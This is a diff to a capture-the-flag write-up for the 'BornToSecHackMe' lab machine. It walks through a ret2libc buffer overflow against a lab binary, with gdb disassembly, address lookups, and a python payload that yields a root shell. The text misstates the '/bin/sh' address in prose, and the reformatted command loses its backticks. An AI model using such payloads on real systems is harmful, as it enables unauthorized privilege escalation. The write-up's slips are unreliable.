@@ -468,9 +468,9 @@ README :
 
 Finish this challenge and use the result as password for 'zaz' user.
 
-And in the end of turtle, we have 
+And in the end of turtle, we have :
 
-Can you digest the message? :)
+> Can you digest the message? :)
 
 Before that, a lot of lines that goes like "move forward x, go backward y, turn left z, turn right w"
 
@@ -527,6 +527,7 @@ To do so, we will be using `gdb` :
 
 With `disass main` 
 
+```assembly
 (gdb) disass main
 Dump of assembler code for function main:
    0x080483f4 <+0>:	push   %ebp
@@ -551,12 +552,14 @@ Dump of assembler code for function main:
    0x08048436 <+66>:	leave  
    0x08048437 <+67>:	ret    
 End of assembler dump.
+```
 
 We can set a breakpoint anywhere in the main function, but before the return statement. for exemple, we will set a breakpoint at the beginning :
 `b *0x080483f4` . And now you run the program.
 
 Now, we try to `disass system` and we get a result.
 
+```assembly
 (gdb) disass system
 Dump of assembler code for function system:
    0xb7e6b060 <+0>:	sub    $0x1c,%esp
@@ -600,20 +603,24 @@ Dump of assembler code for function system:
    0xb7e6b0e7 <+135>:	mov    0xc(%esp),%edx
    0xb7e6b0eb <+139>:	jmp    0xb7e6b0ba <system+90>
 End of assembler dump.
+```
 
 So we keep in mind the address `0xb7e6b060`. It will be this one that we will want to put in our stack, with the address of `/bin/sh` as an argument.
 `disass /bin/sh` won't give us a result, so we have to use something else : 
 `find &system,+9999999,"/bin/sh"` and we now have our second address : `0xb7e6b060`.
 
+```assembly
 (gdb) find &system,+9999999,"/bin/sh"
 0xb7f8cc58
 warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
+```
 
 So we have everything we need now. So how does it works ? If you give a string that is more than 140 bytes, it will store everything in the stack, even if it surpass the original allocated size.
 Because of that, we can overwrite already existing code. And in particular, we want to write a call to the function `system()` with the argument `/bin/sh`. So we need to simulate what's going on inside the stack. 
 For a function call, we will have : 
 
+```assembly
 function address
 function return address
 function argument 1
@@ -621,6 +628,7 @@ function argument 2
 .
 .
 .
+```
 
 So to replicate this we have to (in python):
 
@@ -630,11 +638,15 @@ So to replicate this we have to (in python):
 We have to write the addresses in reverse, because the address is stored in little-endian
 So it goes like this :
 
-`./exploit_me `python -c 'print "oO" * 70 + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7"'``
+```bash
+./exploit_me python -c 'print "oO" * 70 + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7"'
+```
 
 And here we go, we are root
 
+```bash
 zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "oO" * 70 + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7"'`
 oOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO`��IDGBX���
-# whoami
-root
+```
+
+
